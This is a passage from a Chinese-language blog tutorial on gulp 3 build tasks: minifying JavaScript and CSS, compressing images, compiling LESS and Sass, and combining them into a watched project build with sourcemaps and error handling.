找到 js/ 目录下的所有js 文件，压缩它们，将压缩后的文件存放在 dist/js/ 目录下。 gulp 代码 gulp 的所有配置代码都写在 gulpfile.js 文件。 3.1 新建一个 gulpfile.js 文件 12chapter2└── gulpfile.js 3.2 在 gulpfile.js 中编写代码 12// 获取 gulpvar gulp = require('gulp') require() 是 node （CommonJS）中获取模块的语法。 在 gulp 中你只需要理解 require() 可以获取模块。 3.3 获取 gulp-uglify 组件 12// 获取 uglify 模块（用于压缩 JS）var uglify = require('gulp-uglify') 3.4 创建压缩任务 12345678910// 压缩 js 文件// 在命令行使用 gulp script 启动此任务gulp.task('script', function() &#123; // 1. 找到文件 gulp.src('js/*.js') // 2. 压缩文件 .pipe(uglify()) // 3. 另存压缩后的文件 .pipe(gulp.dest('dist/js'))&#125;) gulp.task(name, fn) - 定义任务，第一个参数是任务名，第二个参数是任务内容。 gulp.src(path) - 选择文件，传入参数是文件路径。 gulp.dest(path) - 输出文件 gulp.pipe() - 管道，你可以暂时将 pipe 理解为将操作加入执行队列 参考：gulp API文档 3.5 跳转至 gulpfile.js 所在目录 打开命令行使用 cd 命令跳转至 gulpfile.js 文件所在目录。 例如我的 gulpfile.js 文件保存在 C:\\gulp-book\\demo\\chapter2\\gulpfile.js。 那么就需要在命令行输入1cd C:\\gulp-book\\demo\\chapter2 Mac 用户可使用 cd Documents/gulp-book/demo/chapter2/ 跳转 3.6 使用命令行运行 script 任务 在控制台输入 gulp 任务名 可运行任务，此处我们输入 gulp script 回车。 注意：输入 gulp script 后命令行将会提示错误信息123456// 在命令行输入gulp scriptError: Cannot find module &apos;gulp-uglify&apos; at Function.Module._resolveFilename (module.js:338:15) at Function.Module._load (module.js:280:25) Cannot find module &#39;gulp-uglify&#39; 没有找到 gulp-uglify 模块。 3.7 安装 gulp-uglify 模块 因为我们并没有安装 gulp-uglify 模块到本地，所以找不到此模块。 使用 npm 安装 gulp-uglify 到本地 1npm install gulp-uglify 安装成功后你会看到如下信息：1234567gulp-uglify@1.1.0 node_modules/gulp-uglify├── deepmerge@0.2.7├── uglify-js@2.4.16 (uglify-to-browserify@1.0.2, async@0.2.10, source-map@0.1.34, optimist@0.3.7)├── vinyl-sourcemaps-apply@0.1.4 (source-map@0.1.43)├── through2@0.6.3 (xtend@4.0.0, readable-stream@1.0.33)└── gulp-util@3.0.4 (array-differ@1.0.0, beeper@1.0.0, array-uniq@1.0.2, object-assign@2.0.0, lodash._reinterpolate@3.0.0, lodash._reescape@3.0.0, lodash._reevaluate@3.0.0, replace-ext@0.0.1, minimist@1.1.1, chalk@1.0.0, lodash.template@3.3.2, vinyl@0.4.6, multipipe@0.1.2, dateformat@1.0.11)chapter2 $ 在你的文件夹中会新增一个 node_modules 文件夹，这里面存放着 npm 安装的模块。 目录结构：123├── gulpfile.js└── node_modules └── gulp-uglify 接着输入 gulp script 执行任务 1234gulp script[13:34:57] Using gulpfile ~/Documents/code/gulp-book/demo/chapter2/gulpfile.js[13:34:57] Starting &apos;script&apos;...[13:34:57] Finished &apos;script&apos; after 6.13 ms 3.8 编写 js 文件 我们发现 gulp 没有进行任何压缩操作。因为没有js这个目录，也没有 js 目录下的 .js 后缀文件。 创建 a.js 文件，并编写如下内容 123456// a.jsfunction demo (msg) &#123; alert(&apos;--------\\r\\n&apos; + msg + &apos;\\r\\n--------&apos;)&#125;demo(&apos;Hi&apos;) 目录结构：12345├── gulpfile.js├── js│ └── a.js└── node_modules └── gulp-uglify 接着在命令行输入 gulp script 执行任务 gulp 会在命令行当前目录下创建 dist/js/ 文件夹，并创建压缩后的 a.js 文件。 目录结构：12345678├── gulpfile.js├── js│ └── a.js├── dist│ └── js│ └── a.js└── node_modules └── gulp-uglify dist/js/a.js1function demo(n)&#123;alert(\"--------\\r\\n\"+n+\"\\r\\n--------\")&#125;demo(\"Hi\"); 3.9 检测代码修改自动执行任务 js/a.js一旦有修改 就必须重新在命令行输入 gulp script ，这很麻烦。 可以使用 gulp.watch(src, fn) 检测指定目录下文件的修改后执行任务。 在 gulpfile.js 中编写如下代码：12// 监听文件修改，当文件被修改则执行 script 任务gulp.watch(&apos;js/*.js&apos;, [&apos;script&apos;]); 但是没有命令可以运行 gulp.watch()，需要将 gulp.watch() 包含在一个任务中。 12345// 在命令行使用 gulp auto 启动此任务gulp.task(&apos;auto&apos;, function () &#123; // 监听文件修改，当文件被修改则执行 script 任务 gulp.watch(&apos;js/*.js&apos;, [&apos;script&apos;])&#125;) 接着在命令行输入 gulp auto，自动监听 js/*.js 文件的修改后压缩js。 1234$gulp auto[21:09:45] Using gulpfile ~/Documents/code/gulp-book/demo/chapter2/gulpfile.js[21:09:45] Starting &apos;auto&apos;...[21:09:45] Finished &apos;auto&apos; after 9.19 ms 此时修改 js/a.js 中的代码并保存。命令行将会出现提示，表示检测到文件修改并压缩文件。 12[21:11:01] Starting &apos;script&apos;...[21:11:01] Finished &apos;script&apos; after 2.85 ms 至此，我们完成了 gulp 压缩 js 文件的自动化代码编写。 注意：使用 gulp.watch 后你的命令行会进入“运行”状态，此时你不可以在命令行进行其他操作。可通过 Ctrl + C 停止 gulp。 Mac 下使用 control + C 停止 gulp 3.10 使用 gulp.task(‘default’, fn) 定义默认任务 增加如下代码 1gulp.task('default', ['script', 'auto']); 此时你可以在命令行直接输入 gulp +回车，运行 script 和 auto 任务。 最终代码如下： 123456789101112131415161718192021222324252627// 获取 gulpvar gulp = require('gulp')// 获取 uglify 模块（用于压缩 JS）var uglify = require('gulp-uglify')// 压缩 js 文件// 在命令行使用 gulp script 启动此任务gulp.task('script', function() &#123; // 1. 找到文件 gulp.src('js/*.js') // 2. 压缩文件 .pipe(uglify()) // 3. 另存压缩后的文件 .pipe(gulp.dest('dist/js'))&#125;)// 在命令行使用 gulp auto 启动此任务gulp.task('auto', function () &#123; // 监听文件修改，当文件被修改则执行 script 任务 gulp.watch('js/*.js', ['script'])&#125;)// 使用 gulp.task('default') 定义默认任务// 在命令行使用 gulp 启动 script 任务和 auto 任务gulp.task('default', ['script', 'auto']) 去除注释后，你会发现只需要 11 行代码就可以让 gulp 自动监听 js 文件的修改后压缩代码。但是还有还有一些性能问题和缺少容错性，将在后面的章节详细说明。 你可以访问 gulp-uglify 以查看更多用法。 四、使用 gulp 压缩 CSS 压缩 css 代码可降低 css 文件大小，提高页面打开速度。 我们接着将规律转换为 gulp 代码 规律 找到 css/ 目录下的所有 css 文件，压缩它们，将压缩后的文件存放在 dist/css/ 目录下。 4.1 安装 gulp-minify-css模块 提示：你需要使用命令行的 cd 切换到对应目录后进行安装操作。 在命令行输入 1npm install gulp-minify-css 安装成功后你会看到如下信息：(安装时间可能会比较长) 1234567gulp-minify-css@1.0.0 node_modules/gulp-minify-css├── object-assign@2.0.0├── vinyl-sourcemaps-apply@0.1.4 (source-map@0.1.43)├── clean-css@3.1.8 (commander@2.6.0, source-map@0.1.43)├── through2@0.6.3 (xtend@4.0.0, readable-stream@1.0.33)├── vinyl-bufferstream@1.0.1 (bufferstreams@1.0.1)└── gulp-util@3.0.4 (array-differ@1.0.0, beeper@1.0.0, array-uniq@1.0.2, lodash._reescape@3.0.0, lodash._reinterpolate@3.0.0, lodash._reevaluate@3.0.0, replace-ext@0.0.1, minimist@1.1.1, multipipe@0.1.2, vinyl@0.4.6, chalk@1.0.0, lodash.template@3.3.2, dateformat@1.0.11) 4.2 参照 [使用 gulp 压缩 JS]创建 gulpfile.js 文件编写代码 在对应目录创建 gulpfile.js 文件并写入如下内容： 1234567891011121314151617181920212223242526// 获取 gulpvar gulp = require('gulp')// 获取 minify-css 模块（用于压缩 CSS）var minifyCSS = require('gulp-minify-css')// 压缩 css 文件// 在命令行使用 gulp css 启动此任务gulp.task('css', function () &#123; // 1. 找到文件 gulp.src('css/*.css') // 2. 压缩文件 .pipe(minifyCSS()) // 3. 另存为压缩文件 .pipe(gulp.dest('dist/css'))&#125;)// 在命令行使用 gulp auto 启动此任务gulp.task('auto', function () &#123; // 监听文件修改，当文件被修改则执行 css 任务 gulp.watch('css/*.css', ['css'])&#125;);// 使用 gulp.task('default') 定义默认任务// 在命令行使用 gulp 启动 css 任务和 auto 任务gulp.task('default', ['css', 'auto']) 你可以访问 gulp-minify-css 以查看更多用法。 4.3 创建 css 文件 在 gulpfile.js 对应目录创建 css 文件夹，并在 css/ 目录下创建 a.css 文件。 1234/* a.css */body a&#123; color:pink;&#125; 4.4 运行 gulp 查看效果 在命令行输入 gulp +回车 你将看到命令行出现如下提示 12345678gulp[17:01:19] Using gulpfile ~/Documents/code/gulp-book/demo/chapter3/gulpfile.js[17:01:19] Starting &apos;css&apos;...[17:01:19] Finished &apos;css&apos; after 6.21 ms[17:01:19] Starting &apos;auto&apos;...[17:01:19] Finished &apos;auto&apos; after 5.42 ms[17:01:19] Starting &apos;default&apos;...[17:01:19] Finished &apos;default&apos; after 5.71 μs gulp 会创建 dist/css 目录，并创建 a.css 文件，此文件存放压缩后的 css 代码。dist/css/a.css 五、使用 gulp 压缩图片 压缩 图片文件可降低文件大小，提高图片加载速度。 找到规律转换为 gulp 代码 规律 找到 images/ 目录下的所有文件，压缩它们，将压缩后的文件存放在 dist/images/ 目录下。 5.1 安装 gulp-imagemin 模块 提示：你需要使用命令行的 cd 切换至对应目录再进行安装操作和 gulp 启动操作。 在命令行输入 1npm install gulp-imagemin 安装成功后你会看到如下信息：(安装时间可能会比较长) 1234567gulp-imagemin@2.2.1 node_modules/gulp-imagemin├── object-assign@2.0.0├── pretty-bytes@1.0.3 (get-stdin@4.0.1)├── chalk@1.0.0 (escape-string-regexp@1.0.3, ansi-styles@2.0.1, supports-color@1.3.1, has-ansi@1.0.3, strip-ansi@2.0.1)├── through2-concurrent@0.3.1 (through2@0.6.3)├── gulp-util@3.0.4 (array-differ@1.0.0, beeper@1.0.0, array-uniq@1.0.2, lodash._reevaluate@3.0.0, lodash._reescape@3.0.0, lodash._reinterpolate@3.0.0, replace-ext@0.0.1, minimist@1.1.1, vinyl@0.4.6, through2@0.6.3, multipipe@0.1.2, lodash.template@3.3.2, dateformat@1.0.11)└── imagemin@3.1.0 (get-stdin@3.0.2, optional@0.1.3, vinyl@0.4.6, through2@0.6.3, stream-combiner@0.2.1, concat-stream@1.4.7, meow@2.1.0, vinyl-fs@0.3.13, imagemin-svgo@4.1.2, imagemin-optipng@4.2.0, imagemin-jpegtran@4.1.0, imagemin-pngquant@4.0.0, imagemin-gifsicle@4.1.0) 5.2 创建 gulpfile.js 文件编写代码 在对应目录创建 gulpfile.js 文件并写入如下内容： 12345678910111213141516171819202122232425262728// 获取 gulpvar gulp = require('gulp');// 获取 gulp-imagemin 模块var imagemin = require('gulp-imagemin')// 压缩图片任务// 在命令行输入 gulp images 启动此任务gulp.task('images', function () &#123; // 1. 找到图片 gulp.src('images/*.*') // 2. 压缩图片 .pipe(imagemin(&#123; progressive: true &#125;)) // 3. 另存图片 .pipe(gulp.dest('dist/images'))&#125;);// 在命令行使用 gulp auto 启动此任务gulp.task('auto', function () &#123; // 监听文件修改，当文件被修改则执行 images 任务 gulp.watch('images/*.*)', ['images'])&#125;);// 使用 gulp.task('default') 定义默认任务// 在命令行使用 gulp 启动 images 任务和 auto 任务gulp.task('default', ['images', 'auto']) 你可以访问 gulp-imagemin 以查看更多用法。 5.3 在 images/ 目录下存放图片 在 gulpfile.js 对应目录创建 images 文件夹，并在 images/ 目录下存放图片。 5.4 运行 gulp 查看效果 在命令行输入 gulp +回车 你将看到命令行出现如下提示 123456789gulp[18:10:42] Using gulpfile ~/Documents/code/gulp-book/demo/chapter4/gulpfile.js[18:10:42] Starting &apos;images&apos;...[18:10:42] Finished &apos;images&apos; after 5.72 ms[18:10:42] Starting &apos;auto&apos;...[18:10:42] Finished &apos;auto&apos; after 6.39 ms[18:10:42] Starting &apos;default&apos;...[18:10:42] Finished &apos;default&apos; after 5.91 μs[18:10:42] gulp-imagemin: Minified 3 images (saved 25.83 kB - 5.2%) 使用 gulp 编译 LESS Less 是一门 CSS 预处理语言，它扩充了 CSS 语言，增加了诸如变量、混合（mixin）、函数等功能，让 CSS 更易维护。 安装1npm install gulp-less 基本用法12345678910111213141516171819202122232425// 获取 gulpvar gulp = require('gulp')// 获取 gulp-less 模块var less = require('gulp-less')// 编译less// 在命令行输入 gulp less 启动此任务gulp.task('less', function () &#123; // 1. 找到 less 文件 gulp.src('less/**.less') // 2. 编译为css .pipe(less()) // 3. 另存文件 .pipe(gulp.dest('dist/css'))&#125;);// 在命令行使用 gulp auto 启动此任务gulp.task('auto', function () &#123; // 监听文件修改，当文件被修改则执行 less 任务 gulp.watch('less/**.less', ['less'])&#125;)// 使用 gulp.task('default') 定义默认任务// 在命令行使用 gulp 启动 less 任务和 auto 任务gulp.task('default', ['less', 'auto']) 你可以访问 gulp-less 以查看更多用法。 LESS 代码和编译后的CSS代码less/a.less 12345.less&#123; a&#123; color:pink; &#125;&#125; less/import.less 123456@import \"a.less\";.import&#123; a&#123; color:red; &#125;&#125; less/a.css 123.less a &#123; color: pink;&#125; less/import.css 123456.less a &#123; color: pink;&#125;.import a&#123; color: red;&#125; 六、使用 gulp 编译 Sass 无论是 node-sass 还是 ruby-sass 使用 npm 安装都非常的慢，甚至会装不上。及其不利于团队协作。建议使用 less 作为 css 预处理器。如果因为 less 不支持自定义函数选择用 sass 可以使用 less-plugin-functions 让 less 支持自定义函数。 6.1 gulp-sass 本章使用的是 ruby-sass 如果你不方便安装 ruby 或编译速度慢，建议使用 gulp-sass Sass 是一种 CSS 的开发工具，提供了许多便利的写法，大大节省了开发者的时间，使得 CSS 的开发，变得简单和可维护。 本章使用 ruby-sass 编译 css,若你没有安装 ruby 和 sass 请移步 使用ruby.taobao安装 Sass 6.2 安装 1npm install gulp-ruby-sass 6.3 基本用法 12345678910111213141516171819202122232425// 获取 gulpvar gulp = require('gulp')// 获取 gulp-ruby-sass 模块var sass = require('gulp-ruby-sass')// 编译sass// 在命令行输入 gulp sass 启动此任务gulp.task('sass', function() &#123; return sass('sass/') .on('error', function (err) &#123; console.error('Error!', err.message); &#125;) .pipe(gulp.dest('dist/css'))&#125;);// 在命令行使用 gulp auto 启动此任务gulp.task('auto', function () &#123; // 监听文件修改，当文件被修改则执行 images 任务 gulp.watch('sass/**/*.scss', ['sass'])&#125;);// 使用 gulp.task('default') 定义默认任务// 在命令行使用 gulp 启动 sass 任务和 auto 任务gulp.task('default', ['sass', 'auto']) Sass 代码和编译后的 CSS 代码 sass/a.scss 12345.sass&#123; a&#123; color:pink; &#125;&#125; sass/import.scss 123456@import \"a.scss\";.import&#123; a&#123; color:red; &#125;&#125; sass/a.css 123.sass a &#123; color: pink;&#125; sass/import.css 123456.sass a &#123; color: pink;&#125;.import a&#123; color: red;&#125; 七、使用 gulp 构建一个项目 本章将介绍 gulp-watch-path stream-combiner2 gulp-sourcemaps gulp-autoprefixer 并将之前所有章节的内容组合起来编写一个前端项目所需的 gulp 代码。 若你不了解npm 请务必阅读 npm模块管理器 7.1 package.json 如果你熟悉 npm 则可以利用 package.json 保存所有 npm install --save-dev gulp-xxx 模块依赖和模块版本。 在命令行输入 1npm init 会依次要求补全项目信息，不清楚的可以直接回车跳过12345678name: (gulp-demo) version: (1.0.0) description: entry point: (index.js) test command: ......Is this ok? (yes) 最终会在当前目录中创建 package.json 文件并生成类似如下代码：123456789101112131415161718192021&#123; \"name\": \"gulp-demo\", \"version\": \"0.0.0\", \"description\": \"\", \"scripts\": &#123; \"test\": \"echo \\\"Error: no test specified\\\" &amp;&amp; exit 1\" &#125;, \"repository\": &#123; \"type\": \"git\", \"url\": \"https://github.com/nimojs/gulp-demo.git\" &#125;, \"keywords\": [ \"gulp\", ], \"author\": \"nimojs &lt;nimo.jser@gmail.com&gt;\", \"license\": \"MIT\", \"bugs\": &#123; \"url\": \"https://github.com/nimojs/gulp-demo/issues\" &#125;, \"homepage\": \"https://github.com/nimojs/gulp-demo\"&#125; 7.2 安装依赖 安装 gulp 到项目（防止全局 gulp 升级后与此项目 gulpfile.js 代码不兼容）1npm install gulp --save-dev 此时打开 package.json 会发现多了如下代码 123\"devDependencies\": &#123; \"gulp\": \"^3.8.11\"&#125; 声明此项目的开发依赖 gulp 接着安装其他依赖： 安装模块较多，请耐心等待，若一直安装失败可使用npm.taobao.org 1npm install gulp-uglify gulp-watch-path stream-combiner2 gulp-sourcemaps gulp-minify-css gulp-autoprefixer gulp-less gulp-ruby-sass gulp-imagemin gulp-util --save-dev 此时，package.json 将会更新12345678910111213\"devDependencies\": &#123; \"colors\": \"^1.0.3\", \"gulp\": \"^3.8.11\", \"gulp-autoprefixer\": \"^2.1.0\", \"gulp-imagemin\": \"^2.2.1\", \"gulp-less\": \"^3.0.2\", \"gulp-minify-css\": \"^1.0.0\", \"gulp-ruby-sass\": \"^1.0.1\", \"gulp-sourcemaps\": \"^1.5.1\", \"gulp-uglify\": \"^1.1.0\", \"gulp-watch-path\": \"^0.0.7\", \"stream-combiner2\": \"^1.0.2\"&#125; 当你将这份 gulpfile.js 配置分享给你的朋友时，就不需要将 node_modules/ 发送给他，他只需在命令行输入1npm install 就可以检测 package.json 中的 devDependencies 并安装所有依赖。 7.3 设计目录结构 我们将文件分为2类，一类是源码，一类是编译压缩后的版本。文件夹分别为 src 和 dist。(注意区分 dist 和 ·dest 的区别) 123└── src/│└── dist/ dist/ 目录下的文件都是根据 src/ 下所有源码文件构建而成。 在 src/ 下创建前端资源对应的的文件夹 12345678└── src/ ├── less/ *.less 文件 ├── sass/ *.scss *.sass 文件 ├── css/ *.css 文件 ├── js/ *.js 文件 ├── fonts/ 字体文件 └── images/ 图片└── dist/ 7.4 让命令行输出的文字带颜色 gulp 自带的输出都带时间和颜色，这样很容易识别。我们利用 gulp-util 实现同样的效果。 12345678var gulp = require('gulp')var gutil = require('gulp-util')gulp.task('default', function () &#123; gutil.log('message') gutil.log(gutil.colors.red('error')) gutil.log(gutil.colors.green('message:') + \"some\")&#125;) 使用 gulp 启动默认任务以测试 gulp-util 7.5 配置 JS 任务7.5.1 gulp-uglify检测src/js/目录下的 js 文件修改后，压缩 js/ 中所有 js 文件并输出到 dist/js/ 中 1234567891011var uglify = require('gulp-uglify')gulp.task('uglifyjs', function () &#123; gulp.src('src/js/**/*.js') .pipe(uglify()) .pipe(gulp.dest('dist/js'))&#125;)gulp.task('default', function () &#123; gulp.watch('src/js/**/*.js', ['uglifyjs'])&#125;) src/js/**/*.js 是 glob 语法。百度百科：glob模式 、node-glob 在命令行输入 gulp 后会出现如下消息，表示已经启动。123[20:39:50] Using gulpfile ~/Documents/code/gulp-book/demo/chapter7/gulpfile.js[20:39:50] Starting 'default'...[20:39:50] Finished 'default' after 13 ms 此时编辑 src/js/log.js 文件并保存，命令行会出现如下消息，表示检测到 src/js/**/*.js 文件修改后重新编译所有 js。 12[20:39:52] Starting 'js'...[20:39:52] Finished 'js' after 14 ms 7.5.2gulp-watch-path 此配置有个性能问题，当 gulp.watch 检测到 src/js/ 目录下的js文件有修改时会将所有文件全部编译。实际上我们只需要重新编译被修改的文件。 简单介绍 gulp.watch 第二个参数为 function 时的用法。 123456789101112gulp.watch('src/js/**/*.js', function (event) &#123; console.log(event); /* 当修改 src/js/log.js 文件时 event &#123; // 发生改变的类型，不管是添加，改变或是删除 type: 'changed', // 触发事件的文件路径 path: '/Users/nimojs/Documents/code/gulp-book/demo/chapter7/src/js/log.js' &#125; */&#125;) 我们可以利用 event 给到的信息，检测到某个 js 文件被修改时，只编写当前修改的 js 文件。 可以利用 gulp-watch-path 配合 event 获取编译路径和输出路径。 123456789101112131415161718192021222324var watchPath = require('gulp-watch-path')gulp.task('watchjs', function () &#123; gulp.watch('src/js/**/*.js', function (event) &#123; var paths = watchPath(event, 'src/', 'dist/') /* paths &#123; srcPath: 'src/js/log.js', srcDir: 'src/js/', distPath: 'dist/js/log.js', distDir: 'dist/js/', srcFilename: 'log.js', distFilename: 'log.js' &#125; */ gutil.log(gutil.colors.green(event.type) + ' ' + paths.srcPath) gutil.log('Dist ' + paths.distPath) gulp.src(paths.srcPath) .pipe(uglify()) .pipe(gulp.dest(paths.distDir)) &#125;)&#125;)gulp.task('default', ['watchjs']) use-gulp-watch-path 完整代码 7.5.3 watchPath(event, search, replace, distExt) 参数 说明 event gulp.watch 回调函数的 event search 需要被替换的起始字符串 replace 第三个参数是新的的字符串 distExt 扩展名(非必填) 此时编辑 src/js/log.js 文件并保存，命令行会出现消息，表示检测到 src/js/log.js 文件修改后只重新编译 log.js。 12[21:47:25] changed src/js/log.js[21:47:25] Dist dist/js/log.js 你可以访问 gulp-watch-path 了解更多。 7.5.4 stream-combiner2 编辑 log.js 文件时，如果文件中有 js 语法错误时，gulp 会终止运行并报错。 当 log.js 缺少 )1log('gulp-book' 并保存文件时出现如下错误，但是错误信息不全面。而且还会让 gulp 停止运行。 12345678910events.js:85 throw er; // Unhandled &apos;error&apos; event ^Error at new JS_Parse_Error (/Users/nimojs/Documents/code/gulp-book/demo/chapter7/node_modules/gulp-uglify/node_modules/uglify-js/lib/parse.js:189:18)......js_error (/Users/nimojs/Documents/code/gulp-book/demo/chapter7/node_modules/gulp--book/demo/chapter7/node_modules/gulp-uglify/node_modules/uglify-js/lib/parse.js:1165:20) at maybe_unary (/Users/nimojs/Documents/code/gulp-book/demo/chapter7/node_modules/gulp-uglify/node_modules/uglify-js/lib/parse.js:1328:19) 应对这种情况，我们可以使用 Combining streams to handle errors 文档中推荐的 stream-combiner2 捕获错误信息。 1234567891011121314151617181920212223242526272829303132333435var handleError = function (err) &#123; var colors = gutil.colors; console.log('\\n') gutil.log(colors.red('Error!')) gutil.log('fileName: ' + colors.red(err.fileName)) gutil.log('lineNumber: ' + colors.red(err.lineNumber)) gutil.log('message: ' + err.message) gutil.log('plugin: ' + colors.yellow(err.plugin))&#125;var combiner = require('stream-combiner2')gulp.task('watchjs', function () &#123; gulp.watch('src/js/**/*.js', function (event) &#123; var paths = watchPath(event, 'src/', 'dist/') /* paths &#123; srcPath: 'src/js/log.js', srcDir: 'src/js/', distPath: 'dist/js/log.js', distDir: 'dist/js/', srcFilename: 'log.js', distFilename: 'log.js' &#125; */ gutil.log(gutil.colors.green(event.type) + ' ' + paths.srcPath) gutil.log('Dist ' + paths.distPath) var combined = combiner.obj([ gulp.src(paths.srcPath), uglify(), gulp.dest(paths.distDir) ]) combined.on('error', handleError) &#125;)&#125;) 此时当编译错误的语法时，命令行会出现错误提示。而且不会让 gulp 停止运行。 12345678changed:src/js/log.jsdist:dist/js/log.js--------------Error!fileName: /Users/nimojs/Documents/code/gulp-book/demo/chapter7/src/js/log.jslineNumber: 7message: /Users/nimojs/Documents/code/gulp-book/demo/chapter7/src/js/log.js: Unexpected token eof «undefined», expected punc «,»plugin: gulp-uglify 7.5.5 gulp-sourcemaps JS 压缩前和压缩后比较1234567891011// 压缩前var log = function (msg) &#123; console.log('--------'); console.log(msg) console.log('--------');&#125;log(&#123;a:1&#125;)log('gulp-book')// 压缩后var log=function(o)&#123;console.log(\"--------\"),console.log(o),console.log(\"--------\")&#125;;log(&#123;a:1&#125;),log(\"gulp-book\"); 压缩后的代码不存在换行符和空白符，导致出错后很难调试，好在我们可以使用 sourcemap 帮助调试 12345678910var sourcemaps = require('gulp-sourcemaps')// ...var combined = combiner.obj([ gulp.src(paths.srcPath), sourcemaps.init(), uglify(), sourcemaps.write('./'), gulp.dest(paths.distDir)])// ... 此时 dist/js/ 中也会生成对应的 .map 文件，以便使用 Chrome 控制台调试代码 在线文件示例：src/js/ 至此，我们完成了检测文件修改后压缩 JS 的 gulp 任务配置。 有时我们也需要一次编译所有 js 文件。可以配置 uglifyjs 任务。 12345678910gulp.task('uglifyjs', function () &#123; var combined = combiner.obj([ gulp.src('src/js/**/*.js'), sourcemaps.init(), uglify(), sourcemaps.write('./'), gulp.dest('dist/js/') ]) combined.on('error', handleError)&#125;) 在命令行输入 gulp uglifyjs 以压缩 src/js/ 下的所有 js 文件。 7.6 配置 CSS 任务 有时我们不想使用 LESS 或 SASS而是直接编写 CSS，但我们需要压缩 CSS 以提高页面加载速度。 7.6.1 gulp-minify-css 按照本章中压缩 JS 的方式，先编写 watchcss 任务 123456789101112131415161718var minifycss = require('gulp-minify-css')gulp.task('watchcss', function () &#123; gulp.watch('src/css/**/*.css', function (event) &#123; var paths = watchPath(event, 'src/', 'dist/') gutil.log(gutil.colors.green(event.type) + ' ' + paths.srcPath) gutil.log('Dist ' + paths.distPath) gulp.src(paths.srcPath) .pipe(sourcemaps.init()) .pipe(minifycss()) .pipe(sourcemaps.write('./')) .pipe(gulp.dest(paths.distDir)) &#125;)&#125;)gulp.task('default', ['watchjs','watchcss']) 7.6.2 gulp-autoprefixerautoprefixer 解析 CSS 文件并且添加浏览器前缀到CSS规则里。通过示例帮助理解 autoprefixer 处理前：123.demo &#123; display:flex;&#125; autoprefixer 处理后：12345.demo &#123; display:-webkit-flex; display:-ms-flexbox; display:flex;&#125; 你只需要关心编写标准语法的 css，autoprefixer 会自动补全。 在 watchcss 任务中加入 autoprefixer: 1234567891011121314151617gulp.task('watchcss', function () &#123; gulp.watch('src/css/**/*.css', function (event) &#123; var paths = watchPath(event, 'src/', 'dist/') gutil.log(gutil.colors.green(event.type) + ' ' + paths.srcPath) gutil.log('Dist ' + paths.distPath) gulp.src(paths.srcPath) .pipe(sourcemaps.init()) .pipe(autoprefixer(&#123; browsers: 'last 2 versions' &#125;)) .pipe(minifycss()) .pipe(sourcemaps.write('./')) .pipe(gulp.dest(paths.distDir)) &#125;)&#125;) 更多 autoprefixer 参数请查看 gulp-autoprefixer 有时我们也需要一次编译所有 css 文件。可以配置 minifyss 任务。 12345678910gulp.task('minifycss', function () &#123; gulp.src('src/css/**/*.css') .pipe(sourcemaps.init()) .pipe(autoprefixer(&#123; browsers: 'last 2 versions' &#125;)) .pipe(minifycss()) .pipe(sourcemaps.write('./')) .pipe(gulp.dest('dist/css/'))&#125;) 在命令行输入 gulp minifyss 以压缩 src/css/ 下的所有 .css 文件并复制到 dist/css 目录下 7.7 配置 Less 任务 参考配置 JavaScript 任务的方式配置 less 任务 123456789101112131415161718192021222324252627282930313233343536373839var less = require('gulp-less')gulp.task('watchless', function () &#123; gulp.watch('src/less/**/*.less', function (event) &#123; var paths = watchPath(event, 'src/less/', 'dist/css/') gutil.log(gutil.colors.green(event.type) + ' ' + paths.srcPath) gutil.log('Dist ' + paths.distPath) var combined = combiner.obj([ gulp.src(paths.srcPath), sourcemaps.init(), autoprefixer(&#123; browsers: 'last 2 versions' &#125;), less(), minifycss(), sourcemaps.write('./'), gulp.dest(paths.distDir) ]) combined.on('error', handleError) &#125;)&#125;)gulp.task('lesscss', function () &#123; var combined = combiner.obj([ gulp.src('src/less/**/*.less'), sourcemaps.init(), autoprefixer(&#123; browsers: 'last 2 versions' &#125;), less(), minifycss(), sourcemaps.write('./'), gulp.dest('dist/css/') ]) combined.on('error', handleError)&#125;)gulp.task('default', ['watchjs', 'watchcss', 'watchless']) 7.8 配置 Sass 任务 参考配置 JavaScript 任务的方式配置 Sass 任务 1234567891011121314151617181920212223242526272829303132333435gulp.task('watchsass',function () &#123; gulp.watch('src/sass/**/*', function (event) &#123; var paths = watchPath(event, 'src/sass/', 'dist/css/') gutil.log(gutil.colors.green(event.type) + ' ' + paths.srcPath) gutil.log('Dist ' + paths.distPath) sass(paths.srcPath) .on('error', function (err) &#123; console.error('Error!', err.message); &#125;) .pipe(sourcemaps.init()) .pipe(minifycss()) .pipe(autoprefixer(&#123; browsers: 'last 2 versions' &#125;)) .pipe(sourcemaps.write('./')) .pipe(gulp.dest(paths.distDir)) &#125;)&#125;)gulp.task('sasscss', function () &#123; sass('src/sass/') .on('error', function (err) &#123; console.error('Error!', err.message); &#125;) .pipe(sourcemaps.init()) .pipe(minifycss()) .pipe(autoprefixer(&#123; browsers: 'last 2 versions' &#125;)) .pipe(sourcemaps.write('./')) .pipe(gulp.dest('dist/css'))&#125;)gulp.task('default', ['watchjs', 'watchcss', 'watchless', 'watchsass', 'watchsass']) 7.9 配置 image 任务 123456789101112131415161718192021222324var imagemin = require('gulp-imagemin')gulp.task('watchimage', function () &#123; gulp.watch('src/images/**/*', function (event) &#123; var paths = watchPath(event,'src/','dist/') gutil.log(gutil.colors.green(event.type) + ' ' + paths.srcPath) gutil.log('Dist ' + paths.distPath) gulp.src(paths.srcPath) .pipe(imagemin(&#123; progressive: true &#125;)) .pipe(gulp.dest(paths.distDir)) &#125;)&#125;)gulp.task('image', function () &#123; gulp.src('src/images/**/*') .pipe(imagemin(&#123; progressive: true &#125;)) .pipe(gulp.dest('dist/images'))&#125;) 7.10 配置文件复制任务 复制 src/fonts/ 文件到 dist/ 中 123456789101112131415161718gulp.task('watchcopy', function () &#123; gulp.watch('src/fonts/**/*', function (event) &#123; var paths = watchPath(event) gutil.log(gutil.colors.green(event.type) + ' ' + paths.srcPath) gutil.log('Dist ' + paths.distPath) gulp.src(paths.srcPath) .pipe(gulp.dest(paths.distDir)) &#125;)&#125;)gulp.task('copy', function () &#123; gulp.src('src/fonts/**/*') .pipe(gulp.dest('dist/fonts/'))&#125;)gulp.task('default', ['watchjs', 'watchcss', 'watchless', 'watchsass', 'watchimage', 'watchcopy'])","categories":[{"name":"Build","slug":"Build","permalink":"https://ru23.com/categories/Build/"}],"tags":[{"name":"gulp","slug":"gulp","permalink":"https://ru23.com/tags/gulp/"}]},{"title":"JavaScript运动框架之速度时间版本","slug":"2017-01-js-animate","date":"2017-01-12T07:50:43.000Z","updated":"2018-10-24T03:46:02.059Z","comments":true,"path":"note/258fc88c.html","link":"","permalink":"https://ru23.com/note/258fc88c.html","excerpt":"","text":"一、JavaScript运动框架之速度版 1.1 